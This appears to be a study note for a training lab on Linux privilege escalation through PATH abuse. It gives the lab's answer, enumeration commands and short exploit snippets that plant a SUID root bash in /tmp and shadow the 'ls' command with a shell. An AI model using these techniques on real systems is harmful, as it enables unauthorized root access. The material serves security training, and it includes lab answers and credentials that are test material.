# Section 5 — Path Abuse

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — non-default directory in htb-student's PATH | **`/tmp`** |

Set in `~/.bashrc:118` → `PATH="...:/usr/local/games:/tmp"`. **`/tmp` is world-writable AND in PATH** = textbook path-abuse vector.

---

## Concept

`$PATH` = ordered list of dirs the shell searches for a command typed without an absolute path. **Whoever controls an early/writable PATH entry controls what runs** when a bare command name is invoked.

```bash
echo $PATH
env | grep PATH
echo "$PATH" | tr ':' '\n' | nl     # one dir per line
```

Two abuse conditions to hunt:
1. A **world-writable directory sits in PATH** (e.g. `/tmp`, `/dev/shm`, a user-owned dir) → plant a malicious binary named like a real command.
2. You can **modify a (more-privileged) user's PATH** (their `.bashrc`/`.profile`, or a `sudo`/cron context that doesn't reset PATH) → prepend `.` or a writable dir.

---

## Find the vulnerable PATH entry

```bash
# is the live (interactive) PATH different from a bare ssh cmd? -> check .bashrc/.profile too
for f in ~/.bashrc ~/.profile ~/.bash_profile /etc/profile /etc/environment /etc/profile.d/*; do
  grep -HnE '(^|[^#])PATH=' "$f" 2>/dev/null; done
# writable dirs that are in PATH:
echo "$PATH" | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE in PATH: $d"; done
```
> ⚠️ A non-interactive `ssh host 'echo $PATH'` sources different files than an interactive login — the `/tmp` here only appears for interactive shells (via `~/.bashrc`). **Always grep the profile/rc files**, don't trust one `echo $PATH`. `/tmp`, `/dev/shm`, `/var/tmp`, `.`, and any user-owned dir in PATH are all exploitable.

---

## Exploitation patterns

**A — writable dir in PATH (this box: `/tmp`):** if a root cron/script/SUID binary calls a command *by name* (no absolute path) and resolves it via a PATH containing a dir you can write → plant your payload there.
```bash
# example: a root job runs `backup` (bare name) with /tmp early in PATH
cp /bin/bash /tmp/backup        # or a script:
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/backup
chmod +x /tmp/backup
# when the privileged context runs `backup`, /tmp/backup executes as that user
/tmp/rootbash -p   # -> euid root
```

**B — prepend cwd / writable dir, then shadow a real command:**
```bash
PATH=.:$PATH; export PATH          # or PATH=/tmp:$PATH
cd /some/writable/dir
printf '#!/bin/bash\n/bin/bash -p\n' > ls; chmod +x ls
ls                                  # runs ./ls instead of /bin/ls
```

**C — modify another user's PATH:** if their `.bashrc`/`.profile` is writable, append `export PATH=/tmp:$PATH`; combine with B so their next login runs your shadowed binary as them.

> The win requires a **privileged consumer** (root cron, SUID-root wrapper, another user's shell) that (a) calls a command by *name* and (b) has a *writable* dir earlier in its PATH than the real binary. `/tmp` in PATH is the enabling half — pair it with §6 (cron) / §10 (SUID) findings.

---

## Exam / Engagement Notes

- **"Non-default directory in PATH"** → diff against the distro default `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games[:/snap/bin]`. Anything else (`/tmp`, `.`, `$HOME/...`) is the answer. Here: **`/tmp`**.
- The entry is often in `~/.bashrc`/`~/.profile`/`/etc/profile.d/` — `grep -RnE 'PATH=' <rc files>`; a single `echo $PATH` over non-interactive SSH can miss it.
- Path abuse is rarely a standalone root — it's the **enabler** for cron/SUID/sudo (`secure_path` not set, or script uses bare command names).
- Quick test for writable PATH dirs: `echo $PATH|tr : '\n'|while read d;do [ -w "$d" ]&&echo "$d writable";done`.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. echo $PATH ; grep -RnE 'PATH=' ~/.bashrc ~/.profile /etc/profile
   -> ~/.bashrc:118  PATH=...:/tmp
3. non-default dir = /tmp   ✅
   (world-writable + in PATH -> plant binaries for any privileged bare-name caller)
```

> One line: compare PATH to the distro default; the odd one out (`/tmp`, world-writable) is the abuse primitive — exploit it via whatever privileged thing calls a command by name.
